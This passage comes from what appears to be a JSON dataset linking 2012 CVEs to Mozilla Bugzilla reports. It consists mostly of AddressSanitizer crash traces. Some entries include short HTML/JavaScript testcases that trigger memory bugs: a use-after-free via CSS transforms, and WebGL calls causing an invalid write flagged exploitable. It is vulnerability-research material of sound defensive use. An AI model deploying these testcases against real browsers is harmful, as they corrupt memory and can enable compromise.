js/src/jsinterp.h:109 #22 0x7fdd1c0e3148 in JSFunction::native() const js/src/jscntxtinlines.h:364 #23 0x7fdd1c0d30d9 in js::Interpret(JSContext*, js::StackFrame*, js::InterpMode) js/src/jsinterp.cpp:2370 #24 0x7fdd1c0bdf33 in js::RunScript(JSContext*, JS::Handle<JSScript*>, js::StackFrame*) js/src/jsinterp.cpp:324 #25 0x7fdd1c0e3038 in js::InvokeKernel(JSContext*, JS::CallArgs, js::MaybeConstruct) js/src/jsinterp.cpp:378 #26 0x7fdd1c0e40b7 in js::Invoke(JSContext*, js::InvokeArgsGuard&, js::MaybeConstruct) js/src/jsinterp.h:109 #27 0x7fdd1c1c8527 in js::IndirectProxyHandler::call(JSContext*, JSObject*, unsigned int, JS::Value*) js/src/jsproxy.cpp:450 #28 0x7fdd1c32730d in js::DirectWrapper::call(JSContext*, JSObject*, unsigned int, JS::Value*) js/src/jswrapper.cpp:390 #29 0x7fdd1c327639 in non-virtual thunk to js::CrossCompartmentWrapper::call(JSContext*, JSObject*, unsigned int, JS::Value*) previously allocated by thread T0 here: #0 0x432ec0 in __interceptor_malloc #1 0x7fdd1ee8d228 in moz_xmalloc memory/mozalloc/mozalloc.cpp:57 Shadow byte and word: 0x1ffba03aebf5: fd 0x1ffba03aebf0: fd fd fd fd fd fd fd fd More shadow bytes: 0x1ffba03aebd0: 00 00 00 01 fb fb fb fb 0x1ffba03aebd8: fb fb fb fb fb fb fb fb 0x1ffba03aebe0: fa fa fa fa fa fa fa fa 0x1ffba03aebe8: fa fa fa fa fa fa fa fa =>0x1ffba03aebf0: fd fd fd fd fd fd fd fd 0x1ffba03aebf8: fd fd fd fd fd fd fd fd 0x1ffba03aec00: fa fa fa fa fa fa fa fa 0x1ffba03aec08: fa fa fa fa fa fa fa fa 0x1ffba03aec10: fd fd fd fd fd fd fd fd Stats: 289M malloced (302M for red zones) by 407162 calls Stats: 35M realloced by 20307 calls Stats: 252M freed by 260279 calls Stats: 121M really freed by 107074 calls Stats: 500M (128096 full pages) mmaped in 125 calls mmaps by size class: 8:262128; 9:32764; 10:12285; 11:12282; 12:3072; 13:2048; 14:1280; 15:256; 16:576; 17:1280; 18:288; 19:40; 20:32; 21:4; mallocs by size class: 8:326930; 9:43810; 10:12490; 11:13674; 12:3072; 13:2374; 14:1671; 15:339; 16:815; 17:1616; 18:297; 19:40; 20:31; 21:3; frees by size class: 8:201346; 9:31687; 10:7929; 11:10578; 12:2184; 13:2179; 14:1470; 15:284; 16:725; 17:1600; 18:228; 19:39; 20:27; 21:3; rfrees by size class: 8:79435; 9:13591; 10:2500; 11:7030; 12:870; 13:866; 14:1033; 15:156; 16:460; 17:1116; 18:11; 19:5; 20:1; Stats: malloc large: 1987 small slow: 2137"
      }
    ],
    "CVE-2012-4218": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=767765",
        "title": "Heap-use-after-free BuildTextRunsScanner::BreakSink::SetBreaks",
        "description": "Reproduces on trunk reliably when run from command line. The testcase is ugly, but seems to be dependent on text runs. 20120623201000 http://hg.mozilla.org/mozilla-central/rev/cb2904476d14 ================================================================= ==29398== ERROR: AddressSanitizer heap-use-after-free on address 0x7fd3dc188480 at pc 0x7fd40e3c1930 bp 0x7fffbbf91e10 sp 0x7fffbbf91e08 READ of size 8 at 0x7fd3dc188480 thread T0 #0 0x7fd40e3c1930 in BuildTextRunsScanner::BreakSink::SetBreaks(unsigned int, unsigned int, unsigned char*) layout/generic/nsTextFrameThebes.cpp:855 #1 0x7fd40f6b79bc in nsLineBreaker::FlushCurrentWord() content/base/src/nsLineBreaker.cpp:123 #2 0x7fd40f6c293a in nsLineBreaker::AppendText(nsIAtom*, unsigned char const*, unsigned int, unsigned int, nsILineBreakSink*) content/base/src/nsLineBreaker.cpp:352 #3 0x7fd40e2f188b in BuildTextRunsScanner::SetupBreakSinksForTextRun(gfxTextRun*, void const*, unsigned int) layout/generic/nsTextFrameThebes.cpp:2216 #4 0x7fd40e2dc353 in BuildTextRunsScanner::SetupLineBreakerContext(gfxTextRun*) layout/generic/nsTextFrameThebes.cpp:2127 #5 0x7fd40e2d934f in BuildTextRunsScanner::FlushFrames(bool, bool) layout/generic/nsTextFrameThebes.cpp:1337 #6 0x7fd40e2fcad8 in BuildTextRuns(gfxContext*, nsTextFrame*, nsIFrame*, nsLineList_iterator const*, nsTextFrame::TextRunType) layout/generic/nsTextFrameThebes.cpp:1285 #7 0x7fd40e2f8754 in nsTextFrame::EnsureTextRun(nsTextFrame::TextRunType, gfxContext*, nsIFrame*, nsLineList_iterator const*, unsigned int*) layout/generic/nsTextFrameThebes.cpp:2371 #8 0x7fd40e37cd6d in nsTextFrame::ReflowText(nsLineLayout&, int, nsRenderingContext*, bool, nsHTMLReflowMetrics&, unsigned int&) layout/generic/nsTextFrameThebes.cpp:7388 #9 0x7fd40e1904e8 in nsLineLayout::ReflowFrame(nsIFrame*, unsigned int&, nsHTMLReflowMetrics*, bool&) layout/generic/nsLineLayout.cpp:836 #10 0x7fd40e160ebd in nsInlineFrame::ReflowInlineFrame(nsPresContext*, nsHTMLReflowState const&, nsInlineFrame::InlineReflowState&, nsIFrame*, unsigned int&) layout/generic/nsInlineFrame.cpp:680 #11 0x7fd40e15d5ed in nsInlineFrame::ReflowFrames(nsPresContext*, nsHTMLReflowState const&, nsInlineFrame::InlineReflowState&, nsHTMLReflowMetrics&, unsigned int&) layout/generic/nsInlineFrame.cpp:543 #12 0x7fd40e15a8fa in nsInlineFrame::Reflow(nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&) layout/generic/nsInlineFrame.cpp:397 #13 0x7fd40e19016f in nsLineLayout::ReflowFrame(nsIFrame*, unsigned int&, nsHTMLReflowMetrics*, bool&) layout/generic/nsLineLayout.cpp:824 #14 0x7fd40e160ebd in nsInlineFrame::ReflowInlineFrame(nsPresContext*, nsHTMLReflowState const&, nsInlineFrame::InlineReflowState&, nsIFrame*, unsigned int&) layout/generic/nsInlineFrame.cpp:680 #15 0x7fd40e15d5ed in nsInlineFrame::ReflowFrames(nsPresContext*, nsHTMLReflowState const&, nsInlineFrame::InlineReflowState&, nsHTMLReflowMetrics&, unsigned int&) layout/generic/nsInlineFrame.cpp:543 #16 0x7fd40e15a8fa in nsInlineFrame::Reflow(nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&) layout/generic/nsInlineFrame.cpp:397 #17 0x7fd40e19016f in nsLineLayout::ReflowFrame(nsIFrame*, unsigned int&, nsHTMLReflowMetrics*, bool&) layout/generic/nsLineLayout.cpp:824 #18 0x7fd40de4b52f in nsBlockFrame::ReflowInlineFrame(nsBlockReflowState&, nsLineLayout&, nsLineList_iterator, nsIFrame*, LineReflowStatus*) layout/generic/nsBlockFrame.cpp:3834 #19 0x7fd40de44f8a in nsBlockFrame::DoReflowInlineFrames(nsBlockReflowState&, nsLineLayout&, nsLineList_iterator, nsFlowAreaRect&, int&, nsFloatManager::SavedState*, bool*, LineReflowStatus*, bool) layout/generic/nsBlockFrame.cpp:3630 #20 0x7fd40de37a07 in nsBlockFrame::ReflowInlineFrames(nsBlockReflowState&, nsLineList_iterator, bool*) layout/generic/nsBlockFrame.cpp:3482 #21 0x7fd40de263bc in nsBlockFrame::ReflowLine(nsBlockReflowState&, nsLineList_iterator, bool*) layout/generic/nsBlockFrame.cpp:2570 #22 0x7fd40de0b821 in nsBlockFrame::ReflowDirtyLines(nsBlockReflowState&) layout/generic/nsBlockFrame.cpp:2020 #23 0x7fd40ddff2bf in nsBlockFrame::Reflow(nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&) layout/generic/nsBlockFrame.cpp:1069 #24 0x7fd40deeed97 in nsContainerFrame::ReflowChild(nsIFrame*, nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, int, int, unsigned int, unsigned int&, nsOverflowContinuationTracker*) layout/generic/nsContainerFrame.cpp:906 #25 0x7fd40e0bf237 in nsCanvasFrame::Reflow(nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&) layout/generic/nsCanvasFrame.cpp:429 #26 0x7fd40deeed97 in nsContainerFrame::ReflowChild(nsIFrame*, nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, int, int, unsigned int, unsigned int&, nsOverflowContinuationTracker*) layout/generic/nsContainerFrame.cpp:906 #27 0x7fd40e038b7e in nsHTMLScrollFrame::ReflowScrolledFrame(ScrollReflowState*, bool, bool, nsHTMLReflowMetrics*, bool) layout/generic/nsGfxScrollFrame.cpp:517 #28 0x7fd40e03e42a in nsHTMLScrollFrame::ReflowContents(ScrollReflowState*, nsHTMLReflowMetrics const&) layout/generic/nsGfxScrollFrame.cpp:617 #29 0x7fd40e04274f in nsHTMLScrollFrame::Reflow(nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&) layout/generic/nsGfxScrollFrame.cpp:858 #30 0x7fd40deeed97 in nsContainerFrame::ReflowChild(nsIFrame*, nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, int, int, unsigned int, unsigned int&, nsOverflowContinuationTracker*) layout/generic/nsContainerFrame.cpp:906 #31 0x7fd40e416ff1 in ViewportFrame::Reflow(nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&) layout/generic/nsViewportFrame.cpp:200 #32 0x7fd40db70356 in PresShell::DoReflow(nsIFrame*, bool) layout/base/nsPresShell.cpp:7382 #33 0x7fd40db9dded in PresShell::ProcessReflowCommands(bool) layout/base/nsPresShell.cpp:7523 #34 0x7fd40db9c4fd in PresShell::FlushPendingNotifications(mozFlushType) layout/base/nsPresShell.cpp:3852 #35 0x7fd40dc3f45b in nsRefreshDriver::Notify(nsITimer*) layout/base/nsRefreshDriver.cpp:396 #36 0x7fd41884a086 in nsTimerImpl::Fire() xpcom/threads/nsTimerImpl.cpp:477 #37 0x7fd41884bbfc in nsTimerEvent::Run() xpcom/threads/nsTimerImpl.cpp:558 #38 0x7fd41880e2b3 in nsThread::ProcessNextEvent(bool, bool*) xpcom/threads/nsThread.cpp:625 #39 0x7fd41849e55d in NS_ProcessNextEvent_P(nsIThread*, bool) objdir-ff-asan-sym/xpcom/build/nsThreadUtils.cpp:217 #40 0x7fd4175fbff6 in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) ipc/glue/MessagePump.cpp:82 #41 0x7fd418ac088a in MessageLoop::RunInternal() ipc/chromium/src/base/message_loop.cc:209 #42 0x7fd418ac06d3 in MessageLoop::RunHandler() ipc/chromium/src/base/message_loop.cc:202 #43 0x7fd418ac05b8 in MessageLoop::Run() ipc/chromium/src/base/message_loop.cc:176 #44 0x7fd416b3991e in nsBaseAppShell::Run() widget/xpwidgets/nsBaseAppShell.cpp:165 #45 0x7fd415783518 in nsAppStartup::Run() toolkit/components/startup/nsAppStartup.cpp:256 #46 0x7fd40c1756d7 in XREMain::XRE_mainRun() toolkit/xre/nsAppRunner.cpp:3786 #47 0x7fd40c17c092 in XREMain::XRE_main(int, char**, nsXREAppData const*) toolkit/xre/nsAppRunner.cpp:3863 #48 0x7fd40c17f54b in XRE_main toolkit/xre/nsAppRunner.cpp:3939 #49 0x40a91f in do_main(int, char**) browser/app/nsBrowserApp.cpp:160 #50 0x40834d in main browser/app/nsBrowserApp.cpp:330 #51 0x7fd4269c1c4d in ?? ??:0 0x7fd3dc188480 is located 0 bytes inside of 160-byte region [0x7fd3dc188480,0x7fd3dc188520) freed by thread T0 here: #0 0x4a2ed2 in free ??:0 #1 0x7fd42384f5c3 in moz_free memory/mozalloc/mozalloc.cpp:49 #2 0x7fd40e406fb3 in gfxTextRun::operator delete(void*) ../../dist/include/gfxFont.h:2335 #3 0x7fd418e38148 in ~gfxTextRun gfx/thebes/gfxFont.cpp:4338 #4 0x7fd40e2f778e in nsTextFrame::ClearTextRun(nsTextFrame*, nsTextFrame::TextRunType) layout/generic/nsTextFrameThebes.cpp:4242 #5 0x7fd40e2f3717 in BuildTextRunsScanner::AssignTextRun(gfxTextRun*, float) layout/generic/nsTextFrameThebes.cpp:2343 #6 0x7fd40e2e34b8 in BuildTextRunsScanner::BuildTextRunForFrames(void*) layout/generic/nsTextFrameThebes.cpp:2005 #7 0x7fd40e2d96fd in BuildTextRunsScanner::FlushFrames(bool, bool) layout/generic/nsTextFrameThebes.cpp:1356 #8 0x7fd40e2e95ba in BuildTextRunsScanner::ScanFrame(nsIFrame*) layout/generic/nsTextFrameThebes.cpp:1521 #9 0x7fd40e2e9d99 in BuildTextRunsScanner::ScanFrame(nsIFrame*) layout/generic/nsTextFrameThebes.cpp:1559 #10 0x7fd40e2e9d99 in BuildTextRunsScanner::ScanFrame(nsIFrame*) layout/generic/nsTextFrameThebes.cpp:1559 #11 0x7fd40e2e9d99 in BuildTextRunsScanner::ScanFrame(nsIFrame*) layout/generic/nsTextFrameThebes.cpp:1559 #12 0x7fd40e2e9d99 in BuildTextRunsScanner::ScanFrame(nsIFrame*) layout/generic/nsTextFrameThebes.cpp:1559 #13 0x7fd40e2e9d99 in BuildTextRunsScanner::ScanFrame(nsIFrame*) layout/generic/nsTextFrameThebes.cpp:1559 #14 0x7fd40e2e9d99 in BuildTextRunsScanner::ScanFrame(nsIFrame*) layout/generic/nsTextFrameThebes.cpp:1559 #15 0x7fd40e2e9d99 in BuildTextRunsScanner::ScanFrame(nsIFrame*) layout/generic/nsTextFrameThebes.cpp:1559 #16 0x7fd40e2e9d99 in BuildTextRunsScanner::ScanFrame(nsIFrame*) layout/generic/nsTextFrameThebes.cpp:1559 #17 0x7fd40e2fc896 in BuildTextRuns(gfxContext*, nsTextFrame*, nsIFrame*, nsLineList_iterator const*, nsTextFrame::TextRunType) layout/generic/nsTextFrameThebes.cpp:1260 #18 0x7fd40e2f8754 in nsTextFrame::EnsureTextRun(nsTextFrame::TextRunType, gfxContext*, nsIFrame*, nsLineList_iterator const*, unsigned int*) layout/generic/nsTextFrameThebes.cpp:2371 #19 0x7fd40e37cd6d in nsTextFrame::ReflowText(nsLineLayout&, int, nsRenderingContext*, bool, nsHTMLReflowMetrics&, unsigned int&) layout/generic/nsTextFrameThebes.cpp:7388 #20 0x7fd40e1904e8 in nsLineLayout::ReflowFrame(nsIFrame*, unsigned int&, nsHTMLReflowMetrics*, bool&) layout/generic/nsLineLayout.cpp:836 #21 0x7fd40e160ebd in nsInlineFrame::ReflowInlineFrame(nsPresContext*, nsHTMLReflowState const&, nsInlineFrame::InlineReflowState&, nsIFrame*, unsigned int&) layout/generic/nsInlineFrame.cpp:680 #22 0x7fd40e15d5ed in nsInlineFrame::ReflowFrames(nsPresContext*, nsHTMLReflowState const&, nsInlineFrame::InlineReflowState&, nsHTMLReflowMetrics&, unsigned int&) layout/generic/nsInlineFrame.cpp:543 #23 0x7fd40e15a8fa in nsInlineFrame::Reflow(nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&) layout/generic/nsInlineFrame.cpp:397 #24 0x7fd40e19016f in nsLineLayout::ReflowFrame(nsIFrame*, unsigned int&, nsHTMLReflowMetrics*, bool&) layout/generic/nsLineLayout.cpp:824 #25 0x7fd40e160ebd in nsInlineFrame::ReflowInlineFrame(nsPresContext*, nsHTMLReflowState const&, nsInlineFrame::InlineReflowState&, nsIFrame*, unsigned int&) layout/generic/nsInlineFrame.cpp:680 #26 0x7fd40e15d5ed in nsInlineFrame::ReflowFrames(nsPresContext*, nsHTMLReflowState const&, nsInlineFrame::InlineReflowState&, nsHTMLReflowMetrics&, unsigned int&) layout/generic/nsInlineFrame.cpp:543 #27 0x7fd40e15a8fa in nsInlineFrame::Reflow(nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&) layout/generic/nsInlineFrame.cpp:397 #28 0x7fd40e19016f in nsLineLayout::ReflowFrame(nsIFrame*, unsigned int&, nsHTMLReflowMetrics*, bool&) layout/generic/nsLineLayout.cpp:824 #29 0x7fd40de4b52f in nsBlockFrame::ReflowInlineFrame(nsBlockReflowState&, nsLineLayout&, nsLineList_iterator, nsIFrame*, LineReflowStatus*) layout/generic/nsBlockFrame.cpp:3834 previously allocated by thread T0 here: #0 0x4a2f92 in malloc ??:0 #1 0x7fd42384fa23 in moz_malloc memory/mozalloc/mozalloc.cpp:64 #2 0x7fd418e36a66 in gfxTextRun::AllocateStorageForTextRun(unsigned long, unsigned int) gfx/thebes/gfxFont.cpp:4277 #3 0x7fd418e19dbf in gfxTextRun::Create(gfxTextRunFactory::Parameters const*, unsigned int, gfxFontGroup*, unsigned int) gfx/thebes/gfxFont.cpp:4294 #4 0x7fd418e1d585 in gfxFontGroup::MakeTextRun(unsigned char const*, unsigned int, gfxTextRunFactory::Parameters const*, unsigned int) gfx/thebes/gfxFont.cpp:3367 #5 0x7fd40e2efc31 in gfxTextRun* MakeTextRun<unsigned char>(unsigned char const*, unsigned int, gfxFontGroup*, gfxTextRunFactory::Parameters const*, unsigned int) layout/generic/nsTextFrameThebes.cpp:517 #6 0x7fd40e2e2ea5 in BuildTextRunsScanner::BuildTextRunForFrames(void*) layout/generic/nsTextFrameThebes.cpp:1965 #7 0x7fd40e2d96fd in BuildTextRunsScanner::FlushFrames(bool, bool) layout/generic/nsTextFrameThebes.cpp:1356 #8 0x7fd40e2e95ba in BuildTextRunsScanner::ScanFrame(nsIFrame*) layout/generic/nsTextFrameThebes.cpp:1521 #9 0x7fd40e2e9d99 in BuildTextRunsScanner::ScanFrame(nsIFrame*) layout/generic/nsTextFrameThebes.cpp:1559 #10 0x7fd40e2e9d99 in BuildTextRunsScanner::ScanFrame(nsIFrame*) layout/generic/nsTextFrameThebes.cpp:1559 #11 0x7fd40e2e9d99 in BuildTextRunsScanner::ScanFrame(nsIFrame*) layout/generic/nsTextFrameThebes.cpp:1559 #12 0x7fd40e2e9d99 in BuildTextRunsScanner::ScanFrame(nsIFrame*) layout/generic/nsTextFrameThebes.cpp:1559 #13 0x7fd40e2e9d99 in BuildTextRunsScanner::ScanFrame(nsIFrame*) layout/generic/nsTextFrameThebes.cpp:1559 #14 0x7fd40e2e9d99 in BuildTextRunsScanner::ScanFrame(nsIFrame*) layout/generic/nsTextFrameThebes.cpp:1559 #15 0x7fd40e2e9d99 in BuildTextRunsScanner::ScanFrame(nsIFrame*) layout/generic/nsTextFrameThebes.cpp:1559 #16 0x7fd40e2e9d99 in BuildTextRunsScanner::ScanFrame(nsIFrame*) layout/generic/nsTextFrameThebes.cpp:1559 #17 0x7fd40e2fc896 in BuildTextRuns(gfxContext*, nsTextFrame*, nsIFrame*, nsLineList_iterator const*, nsTextFrame::TextRunType) layout/generic/nsTextFrameThebes.cpp:1260 #18 0x7fd40e2f8754 in nsTextFrame::EnsureTextRun(nsTextFrame::TextRunType, gfxContext*, nsIFrame*, nsLineList_iterator const*, unsigned int*) layout/generic/nsTextFrameThebes.cpp:2371 #19 0x7fd40e37cd6d in nsTextFrame::ReflowText(nsLineLayout&, int, nsRenderingContext*, bool, nsHTMLReflowMetrics&, unsigned int&) layout/generic/nsTextFrameThebes.cpp:7388 #20 0x7fd40e1904e8 in nsLineLayout::ReflowFrame(nsIFrame*, unsigned int&, nsHTMLReflowMetrics*, bool&) layout/generic/nsLineLayout.cpp:836 #21 0x7fd40e160ebd in nsInlineFrame::ReflowInlineFrame(nsPresContext*, nsHTMLReflowState const&, nsInlineFrame::InlineReflowState&, nsIFrame*, unsigned int&) layout/generic/nsInlineFrame.cpp:680 #22 0x7fd40e15d5ed in nsInlineFrame::ReflowFrames(nsPresContext*, nsHTMLReflowState const&, nsInlineFrame::InlineReflowState&, nsHTMLReflowMetrics&, unsigned int&) layout/generic/nsInlineFrame.cpp:543 ==29398== ABORTING Stats: 158M malloced (192M for red zones) by 474222 calls Stats: 42M realloced by 20531 calls Stats: 114M freed by 238653 calls Stats: 0M really freed by 0 calls Stats: 380M (97330 full pages) mmaped in 95 calls mmaps by size class: 8:393192; 9:57337; 10:20475; 11:18423; 12:3072; 13:2048; 14:1536; 15:384; 16:576; 17:128; 18:176; 19:48; 20:16; mallocs by size class: 8:383056; 9:48867; 10:17897; 11:17190; 12:2587; 13:1929; 14:1466; 15:348; 16:547; 17:118; 18:163; 19:41; 20:13; frees by size class: 8:167524; 9:37955; 10:14368; 11:13945; 12:1647; 13:991; 14:1252; 15:291; 16:471; 17:103; 18:58; 19:38; 20:10; rfrees by size class: Stats: malloc large: 335 small slow: 2133 Shadow byte and word: 0x1ffa7b831090: fd 0x1ffa7b831090: fd fd fd fd fd fd fd fd More shadow bytes: 0x1ffa7b831070: fa fa fa fa fa fa fa fa 0x1ffa7b831078: fa fa fa fa fa fa fa fa 0x1ffa7b831080: fa fa fa fa fa fa fa fa 0x1ffa7b831088: fa fa fa fa fa fa fa fa =>0x1ffa7b831090: fd fd fd fd fd fd fd fd 0x1ffa7b831098: fd fd fd fd fd fd fd fd 0x1ffa7b8310a0: fd fd fd fd fd fd fd fd 0x1ffa7b8310a8: fd fd fd fd fd fd fd fd 0x1ffa7b8310b0: fa fa fa fa fa fa fa fa"
      }
    ],
    "CVE-2012-4747": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=785522",
        "title": "[SECURITY] Block access to templates in extensions/",
        "description": "It's currently possible to browse all extensions from the web, though .pm modules are hidden thanks to bugzilla/.htaccess. But all templates remain visible, including their source code: https://landfill.bugzilla.org/bugzilla-tip/extensions/Voting/template/en/default/pages/voting/user.html.tmpl Some custom extensions may contain sensitive data or should simply be outside user's view. It looks like this code is not doing its job correctly, despite what the comment says: http://bonsai.mozilla.org/cvsblame.cgi?file=mozilla/webtools/bugzilla/Bugzilla/Install/Filesystem.pm#209 It looks like that 3.2 and newer are all vulnerable. I will have to check with older versions."
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=785511",
        "title": "Prevent directory browsing in docs/, extensions/ and all other subdirectories of Bugzilla",
        "description": "There is no reason to let all files in the doc/ tree to be browsable from the web, especially those being in xsl/ or lib/. Only files which are supposed to be viewable should be whitelisted. I create docs/.htaccess and configure it so that localizers do not need to create their own .htaccess file. Besides .txt, .pdf and .html files, we also have to whitelist .css, .png and .gif files to be loaded from HTML files."
      }
    ],
    "CVE-2012-5829": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=792305",
        "title": "Heap-buffer-overflow in nsWindow::OnExposeEvent",
        "description": "Reproduces on trunk. Testcase reproduces extremely flakily if i first run firefox with a clean profile (and testcase path on cmd line), then close the firefox completely, and then rerun it again with testcase. Trying to get a minimized testcase. The second-time need might be coming from this line in the testcase InstallTrigger.install({ \"Unsigned XPI\": \"http://example.com/browser/toolkit/mozapps/extensions/test/xpinstall/unsigned.xpi\" }); ================================================================= ==12538== ERROR: AddressSanitizer heap-buffer-overflow on address 0x7f0886f066d8 at pc 0x7f08b8658875 bp 0x7fff30d69ab0 sp 0x7fff30d69aa8 READ of size 1 at 0x7f0886f066d8 thread T0 #0 0x7f08b8658874 in UpdateMaskBits(char*, int, int, nsIntRect const&, unsigned char*, int) widget/gtk2/nsWindow.cpp:4261 #1 0x7f08b8657a51 in nsWindow::OnExposeEvent(_GdkEventExpose*) widget/gtk2/nsWindow.cpp:2222 #2 0x7f08b866816e in expose_event_cb(_GtkWidget*, _GdkEventExpose*) widget/gtk2/nsWindow.cpp:5042 0x7f0886f066d8 is located 0 bytes to the right of 5720-byte region [0x7f0886f05080,0x7f0886f066d8) allocated by thread T0 here: #0 0x4343e0 in __interceptor_malloc #1 0x7f08bc70c3a8 in moz_xmalloc memory/mozalloc/mozalloc.cpp:57 #2 0x7f08b8657a51 in nsWindow::OnExposeEvent(_GdkEventExpose*) widget/gtk2/nsWindow.cpp:2222 #3 0x7f08b866816e in expose_event_cb(_GtkWidget*, _GdkEventExpose*) widget/gtk2/nsWindow.cpp:5042 Shadow byte and word: 0x1fe110de0cdb: fb 0x1fe110de0cd8: 00 00 00 fb fb fb fb fb More shadow bytes: 0x1fe110de0cb8: 00 00 00 00 00 00 00 00 0x1fe110de0cc0: 00 00 00 00 00 00 00 00 0x1fe110de0cc8: 00 00 00 00 00 00 00 00 0x1fe110de0cd0: 00 00 00 00 00 00 00 00 =>0x1fe110de0cd8: 00 00 00 fb fb fb fb fb 0x1fe110de0ce0: fa fa fa fa fa fa fa fa 0x1fe110de0ce8: fa fa fa fa fa fa fa fa 0x1fe110de0cf0: fa fa fa fa fa fa fa fa 0x1fe110de0cf8: fa fa fa fa fa fa fa fa Stats: 293M malloced (320M for red zones) by 521376 calls Stats: 41M realloced by 23856 calls Stats: 248M freed by 255478 calls Stats: 115M really freed by 96425 calls Stats: 532M (136284 full pages) mmaped in 133 calls mmaps by size class: 8:376809; 9:49146; 10:20475; 11:14329; 12:4096; 13:2560; 14:1280; 15:256; 16:576; 17:1248; 18:288; 19:40; 20:20; mallocs by size class: 8:419076; 9:53870; 10:19196; 11:16732; 12:4893; 13:2792; 14:1719; 15:362; 16:881; 17:1501; 18:294; 19:41; 20:19; frees by size class: 8:178304; 9:39375; 10:14131; 11:13204; 12:3650; 13:2549; 14:1466; 15:306; 16:738; 17:1481; 18:219; 19:39; 20:16; rfrees by size class: 8:64681; 9:13811; 10:3824; 11:9587; 12:1194; 13:844; 14:914; 15:151; 16:412; 17:990; 18:11; 19:5; 20:1; Stats: malloc large: 1855 small slow: 2608 ==12538== ABORTING"
      }
    ],
    "CVE-2012-5830": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=775228",
        "title": "use-after-free when loading html file on osx",
        "description": "User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11 Steps to reproduce: loaded: <html> <head> <style> #el0 { -moz-perspective: 1px; } #el1 { -moz-transform: rotateY(1deg); } #el2 { width: 40000; } </style> <script> onload = function() { el0=document.createElement('div') el0.setAttribute('id','el0') document.body.appendChild(el0) el1=document.createElement('tr') el1.setAttribute('id','el1') el0.appendChild(el1) el2=document.createElement('input') el2.setAttribute('id','el2') el1.appendChild(el2) document.body.offsetTop setTimeout(function() { window.open(document.location) },2000) } </script> </head> <body> </body> </html> Actual results: asan said: ==18953== ERROR: AddressSanitizer heap-use-after-free on address 0x000131e9d480 at pc 0x106e8cecc bp 0x7fff5fbeead0 sp 0x7fff5fbeeac8 READ of size 8 at 0x000131e9d480 thread T0 #0 0x106e8cecc in _ZN7mozilla6layersL15PixmanTransformEPK15gfxImageSurfaceS3_RK11gfx3DMatrix8gfxPoint (in XUL) + 764 #1 0x106e8b1c6 in _ZN7mozilla6layersL11Transform3DEP11gfxASurfaceP10gfxContextRK7gfxRectRK11gfx3DMatrixR8gfxPointb (in XUL) + 1990 #2 0x106e8a236 in mozilla::layers::BasicLayerManager::PaintLayer(gfxContext*, mozilla::layers::Layer*, void (*)(mozilla::layers::ThebesLayer*, gfxContext*, nsIntRegion const&, nsIntRegion const&, void*), void*, mozilla::layers::ReadbackProcessor*) (in XUL) + 5254 #3 0x106e89e6f in mozilla::layers::BasicLayerManager::PaintLayer(gfxContext*, mozilla::layers::Layer*, void 0x000131e9d480 is located 0 bytes inside of 72-byte region [0x000131e9d480,0x000131e9d4c8) freed by thread T0 here: #0 0x10000d095 in (anonymous namespace)::mz_free(_malloc_zone_t*, void*) (in firefox) + 85 #1 0x10000cb10 in wrap_free (in firefox) + 80 #2 0x106df1a46 in gfxASurface::Release() (in XUL) + 310 #3 0x106e70557 in gfxQuartzSurface::GetAsImageSurface() (in XUL) + 343 #4 0x106e8abd2 in Expected results: :D"
      }
    ],
    "CVE-2012-5833": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=785734",
        "title": "Mesa crashes on certain texImage2D calls involving level>0",
        "description": "<html> <head> <script> var gl = document.createElement('canvas').getContext('experimental-webgl') var texture = gl.createTexture() gl.bindTexture(gl.TEXTURE_2D, texture) gl.texImage2D(gl.TEXTURE_2D, 6, gl.RGBA, 512, 2, 0, gl.RGBA, gl.UNSIGNED_BYTE, null) gl.deleteTexture(texture) </script> </head> </html> crashes on linux with mesa like: ==32234== ERROR: AddressSanitizer crashed on unknown address 0x000100000011 (pc 0x7fffc5321690 sp 0x7fffffff4988 bp 0x000000000006 T0) AddressSanitizer can not provide additional info. ABORTING #0 0x7fffc5321690 in ?? ??:0 also crashes chrome"
      }
    ],
    "CVE-2012-5835": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=790879",
        "title": "integer overflow, invalid write w/webgl bufferdata",
        "description": "I load: <html> <head> <script> gl=document.createElement('canvas').getContext('experimental-webgl') var buf = gl.createBuffer() gl.bindBuffer(gl.ARRAY_BUFFER, buf) var magic = 0x12345678 gl.bufferData(gl.ARRAY_BUFFER, new Uint8Array(magic+1), gl.STATIC_DRAW) gl.bufferData(gl.ARRAY_BUFFER, Math.pow(2, 32), gl.STATIC_DRAW) gl.bufferSubData(gl.ARRAY_BUFFER, magic, new Uint8Array(1)) </script> </head> </html> and I get: exception=EXC_BAD_ACCESS:signal=11:is_exploitable=yes:instruction_disassembly=movb %al,(%rdi):instruction_address=0x00007fff92c82a41:access_type=write:access_address=0x0000000012345678: Exception Type: EXC_BAD_ACCESS (SIGSEGV) Exception Codes: KERN_INVALID_ADDRESS at 0x0000000012345678 Thread 0 Crashed:: Dispatch queue: com.apple.main-thread 0 libsystem_c.dylib 0x00007fff92c82a41 memmove$VARIANT$sse42 + 57 1 GLEngine 0x000000010cfa9982 glBufferSubData_Exec + 856 rdi: 0x0000000012345678 r11: 0x0000000012345678 r12: 0x0000000012345678 